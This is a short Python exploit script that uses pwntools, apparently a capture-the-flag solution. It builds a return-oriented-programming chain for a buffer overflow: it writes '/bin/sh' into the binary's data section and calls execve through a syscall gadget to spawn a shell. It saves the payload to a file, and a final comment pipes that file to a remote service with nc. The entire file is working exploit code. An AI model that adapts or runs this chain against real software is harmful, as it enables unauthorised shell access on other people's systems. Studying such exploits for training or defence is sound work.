from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('binary')
args = parser.parse_args()

binary = ELF(args.binary)

rop = ROP(binary)

syscall = rop.find_gadget(['syscall']).address
pop_rax_ret = rop.find_gadget(['pop rax', 'ret']).address
pop_rdx_ret = rop.find_gadget(['pop rdx', 'ret']).address
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret']).address
pop_rsi_ret = rop.find_gadget(['pop rsi', 'ret']).address
mov_q_at_rdx_rax = 0x0000000000419748 # mov qword [rdx], rax ; ret
bin_sh = 0x004c00f0                   # random place in .data

conn = open('/tmp/payload', 'wb+')

conn.write(
    b'a' * 0x28 +
    p64(pop_rax_ret) +
    p64(0x68732f6e69622f) + # mov rax, qword '/bin/sh'
    p64(pop_rdx_ret) +
    p64(bin_sh) +           # mov rdx, bin_sh
    p64(mov_q_at_rdx_rax) + # mov qword [bin_sh], qword '/bin/sh'
    p64(pop_rax_ret) +
    p64(59) +               # syscall execve
    p64(pop_rdi_ret) +
    p64(bin_sh) +
    p64(pop_rsi_ret) +
    p64(0) +                # argv
    p64(pop_rdx_ret) +
    p64(0) +                # envp
    p64(syscall) +
    b'\n'
)

conn.close()

# (cat /tmp/payload; cat) | nc 10.x.x.x 9010
